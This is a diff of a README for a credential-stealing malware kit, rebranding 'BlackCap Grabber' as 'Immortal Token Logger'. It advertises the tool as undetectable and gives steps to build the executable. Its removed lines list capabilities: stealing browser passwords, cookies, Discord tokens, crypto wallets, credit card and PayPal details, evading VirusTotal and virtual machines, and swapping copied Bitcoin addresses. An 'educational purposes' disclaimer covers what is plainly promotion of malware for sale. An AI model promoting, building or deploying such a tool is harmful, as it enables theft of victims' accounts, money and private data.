@@ -1,34 +1,23 @@
-# BlackCap Grabber v2.3
-
-![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png)
-
+# Immortal Token Logger
 
 ![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/nowFUD.png)
-##### BlackCap Codes is fully undetectable, the only detections are the fault of pyinstaller we recommend to use Cx_Freeze to compile it
-
-
-##### [:gem: Premium](https://discord.gg/blackcap)
-
-
-<h1 align="center">
- https://discord.gg/blackcap
-</h1>
+##### Immortal Codes is fully undetectable!
 
 
 <h2 align="center">
-  BlackCap Grabber was made with
+  Immortal Token Grabber was made with
 
-Love ❌ code ✅
+Love✅ code ❌
 
 </h2>
 
 `
-Blackcap was created for purely cultural and educational purposes in order to prove that the security of Discord and 
+Immortal was created for purely cultural and educational purposes in order to prove that the security of Discord and 
 other applications is totally to be reviewed. I do not encourage the use of this script on others. 
 That's why I won't be responsible for any damage caused by this script if you use it in violation of my terms of service.`
 
 **NOTE:** 
-- BlackCap was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
+- Immortal was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
 - You got an error? you've find a bug? join the discord or create an issue!
 
 ---
@@ -37,11 +26,9 @@ That's why I won't be responsible for any damage caused by this script if you us
 
 - [🌐・Website](https://blackcap.glitch.me)
 - [🌌・Discord](https://discord.gg/blackcap)
-- [🎉・Setting up BlackCap](#setup)
 - [🔰・Features](#features)
 - [👁️・Features Explanation](#explanation)
 - [📝・Changelog](#changelog)
-- [🦜・Injection](https://github.com/KSCHdsc/BlackCap-Inject)
 - [🕵️‍♂️・Credits](#forkedfrom)
 - [💼・Term](#terms)
 
@@ -49,52 +36,10 @@ That's why I won't be responsible for any damage caused by this script if you us
 ## <a id="setup"></a> 📁 〢 Setting up BlackCap
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [BlackCap Files](https://github.com/KSCHdsc/BlackCap-Grabber/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
-5. Complete the configuration
-6. You have your .exe file enjoy :)
-
-
-## <a id="features"></a>🔰 〢 Features
-
-# 💎 = Premium Features Join the discord to buy
-
-```diff
-> Default:
-
-- Steal Steam / Minecraft / Metamask / Exodus / Roblox / NationGlory login
-- Steal Chrome Passwords / Cookies / History
-- Inject Discord / Discord Canary / Lightcord / Ripcord / Xcord
-- Debug Killer (Kill task gestionary)
-- Bypass TokenProtector / BetterDiscord
-- Take a Screenshot
-- Grabb System Informations
-- Bypass Virus Total machines
-- Bypass VM machines
-- Hide Itself in Background
-- Replace the BTC address copying by your
-- Custom Installer / Setuper
-- Icon / Name / Description Customizable
-- Cookies Exploiter Tech (💎)
-- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others
-- 0/64 Detect Virus Total Builder (.exe) (💎)
-- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) (💎)
-
-
-
-> Injection:
-
-- Nitro Auto Buy
-- First Start Reporter
-- New Passwords
-- New Emails
-- New Login
-- New Credit Card
-- New PayPal
-- Anti Delete system (re install after Discord uninstall / Discord Update)
-> + More!
-```
+2. Install all requirements [install.bat]
+3. Click on start.bat [start.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
+4. Complete the configuration
+5. You have your .exe file enjoy :)
 
 ## <a id="explanation"></a>👁️ 〢 Explanations of Features and options
 
